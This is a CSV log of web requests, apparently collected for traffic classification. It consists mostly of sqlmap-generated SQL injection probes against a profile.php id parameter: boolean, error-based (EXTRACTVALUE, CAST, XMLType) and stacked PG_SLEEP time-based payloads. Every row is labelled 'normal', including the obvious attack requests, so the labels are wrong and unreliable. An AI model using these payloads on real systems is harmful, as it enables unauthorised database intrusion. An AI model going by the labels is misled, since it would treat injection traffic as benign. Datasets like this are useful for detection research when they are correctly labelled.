url,method,status,ua,label
/login.php,POST,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,normal
/login.php,POST,200,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,normal
/profile.php?id=1,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1..%27%22%2C...%2C%2C,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27yHIgpZ%3C%27%22%3EdMDyAZ,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%202287%3D9362%20AND%20%285506%3D5506,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%205835%3D9485,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%202959%3D3472--%20ekqd,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%207243%3D6732%20AND%20%28%27Tqdw%27%3D%27Tqdw,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%205226%3D8235%20AND%20%27wxte%27%3D%27wxte,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=%28SELECT%20%28CASE%20WHEN%20%287409%3D5210%29%20THEN%201%20ELSE%20%28SELECT%205210%20UNION%20SELECT%207149%29%20END%29%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%20EXTRACTVALUE%282014%2CCONCAT%280x5c%2C0x71787a7071%2C%28SELECT%20%28ELT%282014%3D2014%2C1%29%29%29%2C0x717a7a7071%29%29%20AND%20%282297%3D2297,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%20EXTRACTVALUE%282014%2CCONCAT%280x5c%2C0x71787a7071%2C%28SELECT%20%28ELT%282014%3D2014%2C1%29%29%29%2C0x717a7a7071%29%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%20EXTRACTVALUE%282014%2CCONCAT%280x5c%2C0x71787a7071%2C%28SELECT%20%28ELT%282014%3D2014%2C1%29%29%29%2C0x717a7a7071%29%29--%20btiQ,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%20EXTRACTVALUE%282014%2CCONCAT%280x5c%2C0x71787a7071%2C%28SELECT%20%28ELT%282014%3D2014%2C1%29%29%29%2C0x717a7a7071%29%29%20AND%20%28%27jHSt%27%3D%27jHSt,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%20EXTRACTVALUE%282014%2CCONCAT%280x5c%2C0x71787a7071%2C%28SELECT%20%28ELT%282014%3D2014%2C1%29%29%29%2C0x717a7a7071%29%29%20AND%20%27DYHn%27%3D%27DYHn,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%203849%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283849%3D3849%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%282022%3D2022,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%203849%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283849%3D3849%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%203849%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283849%3D3849%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20OykO,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%203849%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283849%3D3849%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27qWhQ%27%3D%27qWhQ,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%203849%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283849%3D3849%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27ujoi%27%3D%27ujoi,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%204358%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284358%3D4358%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%289177%3D9177,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%204358%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284358%3D4358%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%204358%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284358%3D4358%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20dueg,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%204358%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284358%3D4358%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27QkCZ%27%3D%27QkCZ,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%204358%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284358%3D4358%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27uVHE%27%3D%27uVHE,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%286341%3D6341,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20Nsab,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27Ezuc%27%3D%27Ezuc,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%20AND%207197%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287197%3D7197%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27poDb%27%3D%27poDb,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=%28SELECT%20CONCAT%28CONCAT%28%27qxzpq%27%2C%28CASE%20WHEN%20%284467%3D4467%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qzzpq%27%29%29,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%29%3BSELECT%20PG_SLEEP%285%29--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%3BSELECT%20PG_SLEEP%285%29--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%29%3BSELECT%20PG_SLEEP%285%29--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/login.php,GET,200,sqlmap/1.9.8#stable (https://sqlmap.org),normal
/profile.php?id=1%27%3BSELECT%20PG_SLEEP%285%29--,GET,302,sqlmap/1.9.8#stable (https://sqlmap.org),normal
